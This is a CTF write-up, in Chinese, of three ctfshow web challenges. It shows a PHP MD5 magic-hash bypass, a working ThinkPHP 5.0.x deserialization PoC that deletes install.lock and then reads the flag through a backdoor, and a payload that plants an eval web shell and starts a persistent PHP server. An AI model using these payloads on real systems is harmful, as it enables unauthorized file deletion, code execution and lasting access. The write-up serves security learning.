---
title: ctfshow 第二届月饼杯
categories: 赛题wp
---

# web签到
- MD5绕过
```p
<?php
//Author:H3h3QAQ
include "flag.php";
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET["YBB"])) {
    if (hash("md5", $_GET["YBB"]) == $_GET["YBB"]) {
        echo "小伙子不错嘛！！flag给你了：" . $flag;
    } else {
        echo "偶吼，带黑阔被窝抓到了！！！！";
    }
}
```

`0e215962017` 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等

[总结ctf中 MD5 绕过的一些思路](https://blog.csdn.net/CSDNiamcoming/article/details/108837347)

<!--more-->

# eztp
```p
<?php
namespace app\index\controller;
class Index
{   
    public function index($run=[])
    {
        highlight_file(__FILE__);
        echo '<h1>Welcome to CTFSHOW</h1></br>';
        echo 'Powered by PHPthink5.0.2</br>';
        echo dirname(__FILE__);

    if (!empty($run[2])){
            echo 'ZmxhZyBpcyBub3QgaGVyZSBidXQgaXQgaXMgaW4gZmxhZy50eHQ=';
        }
    if (!empty($run[1])){
            unserialize($run[1]);
        }
    }
    // hint:/index/index/backdoor
    public function backdoor(){
        if (!file_exists(dirname(__FILE__).'/../../'."install.lock")){
        echo "Try to post CMD arguments".'<br/>';
            $data = input('post.');
            if (!preg_match('/flag/i',$data['cmd'])){
                $cmd = escapeshellarg($data['cmd']);
        $cmd='cat '.$cmd;
        echo $cmd;
                system($cmd);
            }else{
                echo "No No No";
            }

        }else{
        echo dirname(__FILE__).'/../../'."install.lock has not been deleted";
    }
    }
}

Welcome to CTFSHOW

Powered by PHPthink5.0.2
/var/www/html/application/index/controller
```

要想执行backdoor 需要删除lock文件

根据报错信息知道版本为tp 5.0.24

[tp5.1反序列化分析](https://paper.seebug.org/1040/)

删除文件poc

```p
<?php
namespace think\process\pipes;
use think\Process;
class Pipes{}
class Windows extends Pipes{
	private $files = [];
	function __construct(){
		$this->files = ["/var/www/html/application/index/controller/../../install.lock"];
	}
}
echo urlencode(serialize(New Windows()))."\n";
?>
```
传run[1] , 成功删除,访问 /index.php/index/index/backdoor

payload:
```
cmd=/fl%99ag
```
# 不要离开我
```p
<?php

// 题目说明：
// 想办法维持权限，确定无误后提交check，通过check后，才会生成flag，此前flag不存在

error_reporting(0);
highlight_file(__FILE__);

$a=$_GET['action'];

switch($a){
    case 'cmd':
        eval($_POST['cmd']);
        break;
    case 'check':
        file_get_contents("http://checker/api/check");
        break;
    default:
        die('params not validate');
}
```
payload:
```
cmd=file_put_contents("/tmp/index.php","<?php eval(\$_POST[a]);?>");system ("sleep 5 && php -S 0.0.0.0:80 -t /tmp/");
```
[PHP: 内置Web Server - Manual](https://www.php.net/manual/zh/features.commandline.webserver.php)

`php -S 开启内置服务器   -t 指定目录`


